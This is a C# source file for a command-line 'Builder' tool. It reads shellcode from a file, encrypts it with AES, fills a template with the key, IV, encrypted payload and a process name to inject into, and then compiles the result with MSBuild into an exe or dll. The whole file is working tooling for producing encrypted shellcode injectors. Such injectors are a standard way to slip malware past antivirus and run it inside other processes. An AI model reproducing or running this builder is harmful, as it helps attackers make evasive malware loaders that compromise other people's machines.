using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Security.Cryptography;
using System.Globalization;

namespace Encrypt
{
    class Program
    {
        public static string outputfile;
        static void Main(string[] args)
        {
            if(args == null || args.Length == 0)
            {
                Console.WriteLine("Usage: Builder.exe \"Template\" \"Shellcode File\" processforinjection architecture(x86 or x64) format(exe or dll)");
                return;
            }

            // Create a new instance of the Aes class.  This generates a new key and initialization vector (IV).
            using (Aes myAes = Aes.Create())
            {
                //Store command line args
                string template = args[0];
                string shellcodefile = args[1];
                string injecttarget = args[2];
                string architecture = args[3];
                string format = args[4];
                string cd = Directory.GetCurrentDirectory();

                string[] temppath = template.Split('\\');
                temppath = temppath.Take(temppath.Length - 1).ToArray();
                string buildfile = String.Join("\\", temppath) + "\\" + temppath.Last() +".csproj";
                if(format == "exe")
                {
                    outputfile = String.Join("\\", temppath) + "\\Program.cs";
                }
                else if (format == "dll")
                {
                    outputfile = String.Join("\\", temppath) + "\\Class1.cs";
                }
                //string outputfile = String.Join("\\", temppath) + "\\Program.cs";

                //Read shellcode from file in string format
                string fileinput = File.ReadAllText(shellcodefile);
                //Remove "0x" chars from shellcode so 0xd3 becomes d3 and split string on , into a string array
                string[] inputarray = fileinput.Replace("0x", string.Empty).Split(',');
 
                //Convert each item into a byte and store in array eg. d3 becomes 0xd3 in byte array
                byte[] buf = inputarray.Select(m => byte.Parse(m.ToString(), NumberStyles.HexNumber)).ToArray();
                string bufstring = BitConverter.ToString(buf);

                // Encrypt the shellcode and format
                byte[] encrypted = EncryptStringToBytes_Aes(bufstring, myAes.Key, myAes.IV);
                StringBuilder eshellcode = new StringBuilder(encrypted.Length * 2);
                foreach (byte b in encrypted)
                {
                    eshellcode.AppendFormat("0x{0:x2}, ", b);
                }

                //Convert AESkey and IV to strings, remove trailing characters from encrypted shellcode and format for output
                string MyKey = $"string MyKey = \"{ BitConverter.ToString(myAes.Key)}\";";
                string Myiv = $"string Myiv = \"{ BitConverter.ToString(myAes.IV)}\";";
                string parseshellcode = eshellcode.ToString().Remove(eshellcode.ToString().Length - 2, 2);
                string formattedencryptedshellcode = "byte[] buf = new byte[" + encrypted.Length + "] {" + parseshellcode + "};";

                //Write Key, IV, and encrypted shellcode to console
                string[] output = { MyKey, Myiv, parseshellcode };
                //File.WriteAllLines(args[1], output);

                string text = File.ReadAllText(template);
                text = text.Replace("<KEY>", MyKey);
                text = text.Replace("<IV>", Myiv);
                text = text.Replace("<SHELLCODE>", formattedencryptedshellcode);
                text = text.Replace("<PROCESS>", injecttarget);
                File.WriteAllText(outputfile, text); //Write out to Program.cs which is called in .csproj

                string buildcommand = " /C \"c:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\MSBuild\\Current\\Bin\\amd64\\MSBuild.exe\" " + buildfile + " /p:Configuration=Release /p:Platform=" + architecture + " /t:Clean,Build /p:OutputPath=" + cd;
                //Console.WriteLine(buildcommand);
                System.Diagnostics.Process.Start("CMD.exe", buildcommand);
                /*
                Console.WriteLine(Mykey);
                Console.WriteLine(Myiv);
                Console.WriteLine(formattedencryptedshellcode);
                */

            }
        }


        static byte[] EncryptStringToBytes_Aes(string plainText, byte[] Key, byte[] IV)
        {
            // Check arguments.
            if (plainText == null || plainText.Length <= 0)
                throw new ArgumentNullException("plainText");
            if (Key == null || Key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (IV == null || IV.Length <= 0)
                throw new ArgumentNullException("IV");
            byte[] encrypted;

            // Create an Aes object
            // with the specified key and IV.
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = Key;
                aesAlg.IV = IV;

                // Create an encryptor to perform the stream transform.
                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);

                // Create the streams used for encryption.
                using (MemoryStream msEncrypt = new MemoryStream())
                {
                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                        {
                            //Write all data to the stream.
                            swEncrypt.Write(plainText);
                        }
                        encrypted = msEncrypt.ToArray();
                    }
                }
            }

            // Return the encrypted bytes from the memory stream.
            return encrypted;
        }
    }
}